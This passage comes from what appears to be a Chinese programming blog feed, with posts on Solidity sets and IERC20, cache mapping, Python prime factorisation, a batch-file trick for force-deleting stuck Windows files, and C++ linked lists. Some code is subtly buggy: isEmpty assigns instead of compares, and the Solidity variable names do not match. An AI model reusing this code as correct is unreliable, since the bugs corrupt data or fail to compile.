<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">import &quot;browser/library &amp; set.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Main&#123;</span><br><span class="line">    using Set for Set.Data;</span><br><span class="line">    </span><br><span class="line">    Set.Data myset;</span><br><span class="line">    </span><br><span class="line">    function insert(int key) public returns (bool) &#123;</span><br><span class="line">        return mySet.Insert(key);</span><br><span class="line">    &#125;</span><br><span class="line">    function remove(int key) public returns (bool) &#123;</span><br><span class="line">        return mySet.Remove(key);</span><br><span class="line">    &#125;</span><br><span class="line">    function contain(int key) public view returns (bool) &#123;</span><br><span class="line">        return mySet.Contain(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="IERC20-interface"><a href="#IERC20-interface" class="headerlink" title="IERC20 interface"></a>IERC20 interface</h2><p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    // suo&#x27;you所有cun&#x27;zai所有存在的 Token 数量</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line">    </span><br><span class="line">    // 读取 tokenOwner 这个 address 所持有的 Token 数量</span><br><span class="line">    function balanceOf(address tokenOwner) external view returns (uint256 balance);</span><br><span class="line">    </span><br><span class="line">    // 从 msg.sender 传 tokens 个 Token 给 to 这个 address</span><br><span class="line">    function transfer(address to,uint256 tokens) external returns (bool success);</span><br><span class="line">    </span><br><span class="line">    // 得到 tokenOwner 授权给 spender 使用的 Token 剩余数量</span><br><span class="line">    function allowance(address tokenOwner,address spender) external view returns (uint256 remaining);</span><br><span class="line"></span><br><span class="line">    // msg.sender 授权给 spender 可使用自己的 tokens 个 Token</span><br><span class="line">    function approve(address spender,uint256 tokens) external returns (bool success);</span><br><span class="line"></span><br><span class="line">    // 将 tokens 个 Token 从 from 转到 to</span><br><span class="line">    function transferFrom(address from,address to,uint256 tokens) external returns (bool success);</span><br><span class="line"></span><br><span class="line">    event Transfer(</span><br><span class="line">        address indexed from,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 tokens</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 tokens</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>主存与Cache间地址映射</title>
    <url>/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<p><strong>概念：</strong></p>
<p>与主存容量相比，cache的容量很小，它保存的内容只是主存内容的一个子集，且cache 与主存的数据交换是以块为单位。为了把主存块放到cache中，必须应用某种方法把主存地址定位到cache中，称做地址映射。</p>
<span id="more"></span>
<p>习惯上，cache中的“块”称“行”，主存中称“块”。cache的“行”与主存的“块”存储容量相同。</p>
<h3 id="全相联映射"><a href="#全相联映射" class="headerlink" title="全相联映射"></a>全相联映射</h3><p>理念：主存中的一块可以拷贝到cache中的任意一行。</p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/01.png" alt="121fcc9f36cfac33232518c82af6f171.png"></p>
<p>设主存共分为2^m个块，每块单元数为2^b个</p>
<p><strong>主存地址格式：</strong> 主存块号（m块）+块内偏移地址（b位）<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/02.png" alt="511f0d25c3f32b9fb89b1e7e508052d7.png"></p>
<p><strong>cache地址格式：</strong> cache行号（c位）+行内偏移地址（b位）<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/03.png" alt="72a361a41322b29aba0a5efd4fc548d3.png"><br><strong>cache标记tag：</strong> 主存块号</p>
<p>优点：块冲突概率低，cache利用率高<br>缺点：硬件控制复杂，尤其是用于比较“主存块号”与tag时的比较器电路难于设计与实现。</p>
<p>【例1】设主存容量1MB，Cache容量16KB，块的大小为512B，采用全相联映射方式。</p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/04.png" alt="ffbfcb8395aeb09867b5f7f77c8c3305.png"></p>
<h3 id="直接映射"><a href="#直接映射" class="headerlink" title="直接映射"></a>直接映射</h3><p><strong>理念：</strong> 一个主存块只能拷贝到cache的一个特定行位置去。</p>
<p><strong>直接映射函数为：i = j mod(2^c)</strong><br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/05.png" alt="3c3b123147150bd29f8c3fac5a43091a.png"></p>
<p>将每一区（组）的数据块在区（组）内重新进行编号。使区（组）内各块只能映射到与它区（组）内编号相同的cache行去。</p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/06.png" alt="99d2be1cb4269f13e50c6b350e6298da.png"></p>
<p>假定主存共2^m块，Cache共2^c行，每块/行单元数为2^b。</p>
<p>主存地址为m+b位；Cache地址为c+b位</p>
<p><strong>主存地址格式：</strong> 主存组号+组内块号+块内偏移地址<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/07.png" alt="c9ac93734759032f46feb46023a30a8d.png"></p>
<p><strong>cache地址格式：</strong> cache行号+行内偏移地址<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/08.png" alt="60a052ed83ba1176bd29a96469566e1c.png"><br><strong>cache标记tag：</strong> 映射到该行的主存块的主存地址的“组号”</p>
<p>优点：硬件简单，容易实现，成本低。<br>缺点：发生块冲突的概率较大，导致cache的命中率、效率下降。<br>适用情况：大容量的cache，更多的行数可以减小冲突发生的机会。</p>
<p>【例2】设主存共512个单元（字节），Cache共32个单元，块大小为8个字节，试用直接映射方式组织Cache。</p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/09.png" alt="811ed5c1f9cdc34820d1bda19c8fd2d3.png"></p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/10.png" alt="502508c6ccbfd101ba78c60657143e70.png"></p>
<h3 id="组相联映射"><a href="#组相联映射" class="headerlink" title="组相联映射"></a>组相联映射</h3><p><strong>理念：</strong> 将cache的空间分为若干组，主存块与cache组之间直接映射，而组内各块之间全相联映射。</p>
<p>设Cache共u组，每组r行，则映射函数如下：</p>
<p><strong>组号 q = j mod u （j为主存块号）</strong><br>当Cache的一组包含r行时，通常称为r路组相联映射</p>
<p><strong>关键：</strong> cache的分组数=主存每一组的块数</p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/11.png" alt="474fa8542a2505047b1e90ba35d84c1b.png"></p>
<p><strong>主存地址格式：</strong> 主存组号+组内块号+块内偏移地址<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/12.png" alt="43a834401686fe673954ec0c3f1e82fe.png"></p>
<p><strong>cache地址格式：</strong> cache组号+组内行号+行内偏移地址<br><strong>cache标记tag：</strong> 组号<br><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/13.png" alt="f380a058d0eba3e45b8754e6f42d569e.png"></p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/14.png" alt="79143c8191467dae96c0ca8b1d5d220e.png"></p>
<p><img src="/2020/04/29/%E4%B8%BB%E5%AD%98%E4%B8%8ECache%E9%97%B4%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84/15.png" alt="cadc016abdea0a4962709eb7ea61cda1.png"></p>
]]></content>
  </entry>
  <entry>
    <title>分解质因数</title>
    <url>/2020/02/01/%E5%88%86%E8%A7%A3%E8%B4%A8%E5%9B%A0%E6%95%B0/</url>
    <content><![CDATA[<h1 id="基础练习-分解质因数"><a href="#基础练习-分解质因数" class="headerlink" title="基础练习 分解质因数"></a>基础练习 分解质因数</h1><p><img src="/2020/02/01/%E5%88%86%E8%A7%A3%E8%B4%A8%E5%9B%A0%E6%95%B0/分解质因数图片.png" alt="图片"><br>这里用了两种方法，第一种是暴力解法，超时了，第二种递归，成功AC<br><span id="more"></span></p>
<h2 id="第一种解法-暴力解法："><a href="#第一种解法-暴力解法：" class="headerlink" title="第一种解法 暴力解法："></a>第一种解法 暴力解法：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一种 暴力解法 超时</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">x</span>):</span> <span class="comment">#判断是否为质数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(x ** (<span class="number">1</span>/<span class="number">2</span>))+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="built_in">input</span>() <span class="comment">#接收输入</span></span><br><span class="line">arr = str1.split(<span class="string">&#x27; &#x27;</span>) <span class="comment">#分割成数组</span></span><br><span class="line">a = <span class="built_in">int</span>(arr[<span class="number">0</span>]) <span class="comment">#取出开始值</span></span><br><span class="line">b = <span class="built_in">int</span>(arr[<span class="number">1</span>]) <span class="comment">#取出结束值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a,b+<span class="number">1</span>): <span class="comment">#循环输出每一次的结果</span></span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i),<span class="string">&#x27;=&#x27;</span>]) <span class="comment">#先得出前面的</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(i): <span class="comment">#是质数的话就是本身</span></span><br><span class="line">        str1 = <span class="string">&#x27;&#x27;</span>.join([str1,<span class="built_in">str</span>(i)])</span><br><span class="line">        <span class="built_in">print</span>(str1)</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是质数</span></span><br><span class="line">        tmp = [] <span class="comment">#一个空列表</span></span><br><span class="line">        t = i</span><br><span class="line">        <span class="keyword">while</span> t != <span class="number">1</span>: <span class="comment">#经过一次一次除，最后除到1结束</span></span><br><span class="line">            j = <span class="number">2</span> <span class="comment">#最小的质数为2，从2开始</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= t: <span class="comment">#从2开始找最小能整除t的值</span></span><br><span class="line">                <span class="keyword">if</span> isPrime(j) <span class="keyword">and</span> t % j == <span class="number">0</span>:</span><br><span class="line">                    tmp.append(j)</span><br><span class="line">                    t /= j</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment">#找到一个就结束，重新开始找</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span> <span class="comment">#不符合要求加1</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="number">1</span>: <span class="comment">#当等于1时跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#tmp = sorted(tmp) #因为是从小到大找的，不用排序也行</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)): <span class="comment">#然后按照列表开始输出</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                str1 = str1 + <span class="built_in">str</span>(tmp[j])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                str1 = str1 + <span class="string">&#x27;*&#x27;</span> + <span class="built_in">str</span>(tmp[j])</span><br><span class="line">        <span class="built_in">print</span>(str1)</span><br></pre></td></tr></table></figure>
<h2 id="第二种解法-递归"><a href="#第二种解法-递归" class="headerlink" title="第二种解法 递归"></a>第二种解法 递归</h2><p>用乘积的方式进行计算，等于值时得到对应的质因数分解<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第二种方法 递归</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span> <span class="comment">#判断是否为质数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcuate</span>(<span class="params">num,tmp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(num ** (<span class="number">1</span>/<span class="number">2</span>)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span> <span class="keyword">and</span> isPrime(i):</span><br><span class="line">            tmp.append(i)</span><br><span class="line">            num = num // i</span><br><span class="line">            <span class="keyword">return</span> calcuate(num,tmp)</span><br><span class="line">    tmp.append(num)</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)): <span class="comment">#循环列表返回值</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            str1 += <span class="built_in">str</span>(tmp[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str1 += <span class="string">&#x27;*&#x27;</span> + <span class="built_in">str</span>(tmp[i])</span><br><span class="line">    <span class="keyword">return</span> str1    </span><br><span class="line">str1 = <span class="built_in">input</span>()</span><br><span class="line">arr = str1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(arr[<span class="number">0</span>])</span><br><span class="line">b = <span class="built_in">int</span>(arr[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a,b+<span class="number">1</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i),<span class="string">&#x27;=&#x27;</span>])</span><br><span class="line">    str1 += calcuate(i,tmp)</span><br><span class="line">    <span class="built_in">print</span>(str1)</span><br></pre></td></tr></table></figure></p>
<h1 id="算法提高-质因数"><a href="#算法提高-质因数" class="headerlink" title="算法提高 质因数"></a>算法提高 质因数</h1><p><img src="/2020/02/01/%E5%88%86%E8%A7%A3%E8%B4%A8%E5%9B%A0%E6%95%B0/质因数.png" alt="图片"><br>这个就是上个题的简写版，按照同样的递归方法即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span> <span class="comment">#判断是否为质数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(num ** (<span class="number">1</span>/<span class="number">2</span>))+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcuate</span>(<span class="params">num,tmp</span>):</span> <span class="comment">#进行递归求解</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(num ** (<span class="number">1</span>/<span class="number">2</span>))+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> isPrime(i) <span class="keyword">and</span> num % i == <span class="number">0</span>:</span><br><span class="line">            tmp.append(i)</span><br><span class="line">            <span class="comment">#num = num // i</span></span><br><span class="line">            <span class="keyword">return</span> calcuate(num//i,tmp)</span><br><span class="line">    tmp.append(num)</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            str1 += <span class="built_in">str</span>(tmp[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str1 += <span class="string">&#x27;*&#x27;</span> + <span class="built_in">str</span>(tmp[i])</span><br><span class="line">    <span class="keyword">return</span> str1</span><br><span class="line">a = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">tmp = []</span><br><span class="line">str1 = <span class="built_in">str</span>(a) + <span class="string">&#x27;=&#x27;</span> + calcuate(a,tmp)</span><br><span class="line"><span class="built_in">print</span>(str1) <span class="comment">#打印值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>删除文件出现“该项目不在请确认该项目的位置”</title>
    <url>/2020/11/01/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%87%BA%E7%8E%B0%E2%80%9C%E8%AF%A5%E9%A1%B9%E7%9B%AE%E4%B8%8D%E5%9C%A8%E8%AF%B7%E7%A1%AE%E8%AE%A4%E8%AF%A5%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BD%8D%E7%BD%AE%E2%80%9D/</url>
    <content><![CDATA[<p>删除文件时出现“找不到该项目，该项目不在….请确认该项目的位置”，<br><span id="more"></span><br>如下图：<br><img src="/2020/11/01/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%87%BA%E7%8E%B0%E2%80%9C%E8%AF%A5%E9%A1%B9%E7%9B%AE%E4%B8%8D%E5%9C%A8%E8%AF%B7%E7%A1%AE%E8%AE%A4%E8%AF%A5%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BD%8D%E7%BD%AE%E2%80%9D/1.png" alt="093dc7d4f6ad02007a306ebcc3d2c9c6.png"></p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><ul>
<li>首先新建一个txt文件，把下面的代码复制到里面然后保存</li>
</ul>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">DEL <span class="string">/F</span> <span class="string">/A</span> <span class="string">/Q</span> \\?\%1</span><br><span class="line">RD <span class="string">/S</span> <span class="string">/Q</span> \\?\%1</span><br></pre></td></tr></table></figure>
<ul>
<li>然后把文件扩展名改为：aa.bat（<strong>注意：把这个文件名和想要删除的那个文件或文件夹名字一样</strong>）。</li>
</ul>
<p><img src="/2020/11/01/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%87%BA%E7%8E%B0%E2%80%9C%E8%AF%A5%E9%A1%B9%E7%9B%AE%E4%B8%8D%E5%9C%A8%E8%AF%B7%E7%A1%AE%E8%AE%A4%E8%AF%A5%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BD%8D%E7%BD%AE%E2%80%9D/2.png" alt="0f64974316a5d5b10048ee7bcda81016.png"></p>
<ul>
<li>接下来把想要删除的那个文件拖动到刚刚的bat文件上</li>
</ul>
<p><img src="/2020/11/01/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%87%BA%E7%8E%B0%E2%80%9C%E8%AF%A5%E9%A1%B9%E7%9B%AE%E4%B8%8D%E5%9C%A8%E8%AF%B7%E7%A1%AE%E8%AE%A4%E8%AF%A5%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BD%8D%E7%BD%AE%E2%80%9D/3.png" alt="21a93b52571306316b0904bb231b4d17.png"></p>
<ul>
<li>顽固的文件或文件夹就被删除了</li>
</ul>
]]></content>
      <categories>
        <category>computer tips</category>
      </categories>
      <tags>
        <tag>computer tips</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表的实现</title>
    <url>/2020/11/20/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>学过数据结构后，只是知道链表是什么，有什么用，但真到用和实现时，却总是感觉无从下手，本文来梳理一遍链表的实现</p>
<span id="more"></span>
<h2 id="单链表的实现"><a href="#单链表的实现" class="headerlink" title="单链表的实现"></a>单链表的实现</h2><h3 id="链表的初始化和创建"><a href="#链表的初始化和创建" class="headerlink" title="链表的初始化和创建"></a>链表的初始化和创建</h3><h4 id="链表初始化"><a href="#链表初始化" class="headerlink" title="链表初始化"></a>链表初始化</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单链表的初始化 L为指向头结点的头指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// 构造一个空的单链表L</span></span><br><span class="line">    L = <span class="keyword">new</span> Node;   <span class="comment">// 生成新的结点作为头结点，用头结点L指向头结点（这时候L就代表改单链表）</span></span><br><span class="line">    L-&gt;next= <span class="literal">NULL</span>;  <span class="comment">// 头结点的指针域置空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="头插法创建单链表"><a href="#头插法创建单链表" class="headerlink" title="头插法创建单链表"></a>头插法创建单链表</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头插法创建单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList_H</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node* p = <span class="keyword">new</span> Node; <span class="comment">// 生成新节点指针p p指向新的结点</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;请输入第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;个元素：&quot;</span>;</span><br><span class="line">        cin&gt;&gt;p-&gt;data;</span><br><span class="line">        p-&gt;next = L-&gt;next; <span class="comment">// 从头部插入</span></span><br><span class="line">        L-&gt;next = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="尾插法创建单链表"><a href="#尾插法创建单链表" class="headerlink" title="尾插法创建单链表"></a>尾插法创建单链表</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 尾插法创建单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList_R</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* r = L; <span class="comment">// 尾指针r指向头结点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node* p = <span class="keyword">new</span> Node; <span class="comment">// 生成新指针结点p</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;请输入第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;个元素：&quot;</span>;</span><br><span class="line">        cin&gt;&gt;p-&gt;data;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 将新节点的指针域置空</span></span><br><span class="line">        r-&gt;next = p; <span class="comment">// 将新节点*p插入尾结点*r之后</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><h4 id="获取指定位置单链表值"><a href="#获取指定位置单链表值" class="headerlink" title="获取指定位置单链表值"></a>获取指定位置单链表值</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取指定位置单链表值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetElem</span><span class="params">(LinkList L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L-&gt;next; <span class="comment">// 生成新指针结点p指向首元结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j &lt; i)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next; <span class="comment">// p指向下一个结点</span></span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j &gt; i)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;i的值不合法!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout&lt;&lt;p-&gt;data&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="查找指定的值，返回元素结点指针"><a href="#查找指定的值，返回元素结点指针" class="headerlink" title="查找指定的值，返回元素结点指针"></a>查找指定的值，返回元素结点指针</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单链表按值查找，返回值为找到的元素结点的指针</span></span><br><span class="line"><span class="function">Node* <span class="title">LocateElem</span><span class="params">(LinkList L,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L-&gt;next; <span class="comment">// 初始化p，使p指向首元结点</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next; <span class="comment">//顺链表扫描，直到p为空或者找到相应元素为止</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否为空"><a href="#判断是否为空" class="headerlink" title="判断是否为空"></a>判断是否为空</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断链表是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">isEmpty</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;next = <span class="literal">NULL</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;链表为空&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;链表不为空&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="单链表插入和删除"><a href="#单链表插入和删除" class="headerlink" title="单链表插入和删除"></a>单链表插入和删除</h3><h4 id="单链表在指定位置插入元素"><a href="#单链表在指定位置插入元素" class="headerlink" title="单链表在指定位置插入元素"></a>单链表在指定位置插入元素</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单链表指定位置插入元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkInsert</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> i,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L; <span class="comment">// 生成新指针结点p指向链表L 因为有可能插入到第一个，所以不指向头结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j &lt; i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j &gt; i<span class="number">-1</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;插入位置不合法！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Node* s = <span class="keyword">new</span> Node; <span class="comment">// 生成新指针结点s</span></span><br><span class="line">        s-&gt;data = e; <span class="comment">// 将结点指针s的数据域置为e</span></span><br><span class="line">        s-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = s;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;数据插入成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span 